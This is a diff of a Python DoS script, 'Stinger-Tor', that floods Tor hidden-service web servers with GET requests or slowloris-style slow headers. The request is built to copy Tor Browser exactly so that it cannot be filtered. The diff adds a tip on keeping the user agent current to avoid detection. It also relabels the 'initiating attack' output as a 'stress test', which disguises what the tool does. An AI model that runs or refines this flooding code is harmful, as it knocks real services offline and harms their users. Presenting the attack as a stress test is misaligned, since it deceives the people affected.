@@ -1,10 +1,7 @@
 #!/usr/bin/env python
 #Stinger-Tor
-#Coded by @WhitePacket ~ whitepacket.org
 #Function names are written in the order metasploit launches attacks: RECON - EXPLOIT - PAYLOAD - LOOT for entertainment purposes.
 #Requires Socksipy (socks.py) in the current directory. Download it from here: https://raw.githubusercontent.com/mikedougherty/SocksiPy/master/socks.py
-#Donate BTC (nobody ever does): 1MfxuyEFY6StHo3gBPdNyRWGFDMxRutEXp
-#Maybe certain, non-specific illegal Tor servers can be digitally protested using DoS, and no longer exist. That would be really nice.
 #I'm not responsible for any damages or consequences resulting from the use of this script, you are.
 #For legal, research purposes only!
 
@@ -40,7 +37,7 @@ exploit = ("GET / HTTP/1.1\r\n"
            "Accept-Encoding: gzip, deflate\r\n"
            "Connection: keep-alive\r\n\r\n"
            % (args.s)) #Exact replica of the HTTP request sent by the Tor Browser Bundle, filtering this request will be DoS in itself.
-
+# update: you will want to change the user agent to the latest Tor Browser UA or just copy a full request using Live HTTP Headers or Wireshark so it stays identical.
 def payload(s, exploit): #floods the open socket with GET requests till it closes (if ever), or opens as many sockets as possible and slowly sends the HTTP headers.
     if args.m.lower().startswith("slow") or args.m.lower() == '1':
         while 1:
@@ -86,8 +83,8 @@ if not args.m.lower().startswith('slow') and not args.m == "1":
 
 print '*********************************'
 print '*           [stinger]           *'
-print '*      initiating attack..      *'
-print '*       -attack details-        *'
+print '*    initiating stress test..   *'
+print '*     -stress test details-     *'
 print '*  host: '+args.s+' *'
 nex = '*  server port: '+str(args.p)
 for x in range(0,15 - len(list(str(args.p))) + 1):
